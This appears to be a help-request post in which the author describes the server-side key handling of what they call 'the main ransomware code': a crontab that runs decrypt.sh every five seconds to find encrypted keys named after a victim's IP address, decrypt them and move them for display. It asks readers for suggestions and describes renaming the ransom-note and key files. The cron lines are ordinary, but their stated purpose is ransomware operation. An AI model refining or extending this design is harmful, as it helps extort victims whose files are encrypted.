I have planned to use cronjob to check a location on the server to check if there is an encrypted key in that folder once there is a key with the IP address as the name of the file then file should be decrypted and sent to another place on the sever to be shown,

please go through the files and let me know if you have any suggestions, 


		ISSUES
I also have 2 issues with this, 
EMAIL_ME.txt shouldn't be so, it should be the encrytion file, eg (35.245.875.232) and the decrypted_fernet_key.txt should be "d" followed by the IP address eg d(35.245.875.232) if this will work, then we have to work more on the decryption face of the main ransomware code PUT_ME_ON_DESKTOP.txt would now be the victims IP address but will start from "d" and followed by the IP Address... 



	cronjob
* * * * * cd ~/Desktop/bashtest && ./decrypt.sh
* * * * * ( sleep 5 ; cd ~/Desktop/bashtest && ./decrypt.sh )
* * * * * ( sleep 10 ; cd ~/Desktop/bashtest && ./decrypt.sh )
* * * * * ( sleep 15 ; cd ~/Desktop/bashtest && ./decrypt.sh )
* * * * * ( sleep 20 ; cd ~/Desktop/bashtest && ./decrypt.sh )
* * * * * ( sleep 25 ; cd ~/Desktop/bashtest && ./decrypt.sh )
* * * * * ( sleep 30 ; cd ~/Desktop/bashtest && ./decrypt.sh )
* * * * * ( sleep 35 ; cd ~/Desktop/bashtest && ./decrypt.sh )
* * * * * ( sleep 40 ; cd ~/Desktop/bashtest && ./decrypt.sh )
* * * * * ( sleep 45 ; cd ~/Desktop/bashtest && ./decrypt.sh )
* * * * * ( sleep 50 ; cd ~/Desktop/bashtest && ./decrypt.sh )
* * * * * ( sleep 55 ; cd ~/Desktop/bashtest && ./decrypt.sh )

the above cronjob starts after the first min and runs every 5 seconds
